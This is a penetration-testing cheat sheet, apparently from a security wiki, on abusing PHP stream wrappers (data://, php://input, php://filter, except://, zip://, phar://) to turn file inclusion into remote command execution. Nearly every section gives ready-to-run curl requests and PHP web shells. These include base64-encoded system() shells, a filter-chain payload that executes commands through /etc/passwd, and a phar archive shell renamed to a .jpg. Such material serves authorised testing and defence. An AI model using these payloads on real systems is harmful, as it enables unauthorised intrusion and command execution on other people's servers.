# PHP wrappers and streams

<details>

<summary>data://</summary>

The attribute `allow_url_include` must be set. This configuration can be checked in the `php.ini` file.

{% code overflow="wrap" %}
```bash
# Shell in base64 encoding
echo "<?php system($_GET['cmd']); ?>" | base64

# Accessing the log file via LFI
curl --user-agent "PENTEST" "$URL/?parameter=data://text/plain;base64,$SHELL_BASE64&cmd=id"
```
{% endcode %}

</details>

<details>

<summary>php://input</summary>

The attribute `allow_url_include` should be set. This configuration can be checked in the `php.ini` file.

{% code overflow="wrap" %}
```bash
# Testers should make sure to change the $URL
curl --user-agent "PENTEST" -s -X POST --data "<?php system('id'); ?>" "$URL?parameter=php://input"
```
{% endcode %}

</details>

<details>

<summary>php://filter</summary>

The `filter` wrapper doesn't require the `allow_url_include` to be set. This works on default PHP configuration `allow_url_include=off`.

{% code overflow="wrap" %}
```bash
# Testers should make sure to change the $URL, $FILTERS with the chaining that generates their payload and $FILE with the path to the file they can read.
curl --user-agent "PENTEST" "$URL?parameter=php://filter/$FILTERS/resource=$FILE"
```
{% endcode %}

The [php\_filter\_chain\_generator.py](https://github.com/synacktiv/php\_filter\_chain\_generator/blob/main/php\_filter\_chain\_generator.py) script (Python3) implements the generation of the PHP filters chaining.

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># Example: generate &#x3C;?=`$_GET[cmd]`;;?> (base64 value: PD89YCRfR0VUW2NtZF1gOzs/Pg) using /etc/passwd file to run whoami command on the target.
<strong>
</strong><strong># Generate the payload 
</strong>python3 php_filter_chain_generator.py --chain '&#x3C;?=`$_GET[cmd]`;;?>'

# Fill variables
FILTERS="convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|[...]|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode"
FILE="/etc/passwd"

# Get RCE on the target
curl --user-agent "PENTEST" "$URL?parameter=php://filter/$FILTERS/resource=$FILE&#x26;cmd=whoami"
</code></pre>

Finding a valid path to a file on the target is not required. PHP wrappers like `php://temp` can be used instead.

The research article "[PHP filters chain: What is it and how to use it](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)" from Synacktiv, and [the original writeup](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d), go into the details of that technique.

</details>

<details>

<summary>except://</summary>

The `except` wrapper doesn't required the `allow_url_include` configuration, the `except` extension is required instead.

```bash
curl --user-agent "PENTEST" -s "$URL/?parameter=except://id"
```

</details>

<details>

<summary>zip://</summary>

The prerequisite for this method is to be able to [upload a file](../../../../web-services/attacks-on-inputs/unrestricted-file-upload.md).

{% code overflow="wrap" %}
```bash
echo "<?php system($_GET['cmd']); ?>" > payload.php
zip payload.zip payload.php

# Accessing the log file via LFI (the # identifier is URL-encoded)
curl --user-agent "PENTEST" "$URL/?parameter=zip://payload.zip%23payload.php&cmd=id"
```
{% endcode %}

</details>

<details>

<summary>phar://</summary>

The prerequisite for this method is to be able to [upload a file](../../../../web-services/attacks-on-inputs/unrestricted-file-upload.md).

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

The tester need to compile this script into a `.phar` file that when called would write a shell called `shell.txt` .

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now the tester has a `phar` file named `shell.jpg` and he can trigger it through the `phar://` wrapper.

{% code overflow="wrap" %}
```bash
curl --user-agent "PENTEST" "$URL/?parameter=phar://./shell.jpg%2Fshell.txt&cmd=id"
```
{% endcode %}

</details>
